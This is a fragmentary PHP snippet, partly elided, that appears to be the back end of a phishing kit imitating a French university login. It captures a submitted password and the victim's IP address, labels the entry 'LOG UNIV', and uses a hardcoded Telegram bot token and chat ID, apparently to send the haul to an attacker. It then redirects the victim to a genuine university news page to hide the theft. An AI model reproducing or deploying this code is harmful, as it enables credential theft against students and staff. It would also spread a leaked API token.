...
function get_user_countrycode() {
    ...
    return $countrycode;
        ...
        if(isset($_POST['nom'])){
            ...
            $Results = '    ✔️ LOG UNIV ' . $_SERVER[''] . "\r\n";
            $Results .= '' . $_POST[''] . "\r\n";
            $Results .= ' ✔️ Pass : ' . $_POST['nom'] . "\r\n";
	    ...
	    $Results .= 'IP address : ' . get_user_ip() . "\r\n";
            ...
            $apiToken = "7718928006:AAHorG-91zPQVlzHhBmRg7bc7EUT088I1XY";
            $data = [
                'chat_id' => '-1598917262', 
            ...
            header("Location: https://franceuniversites.fr/actualites-2/");
        }
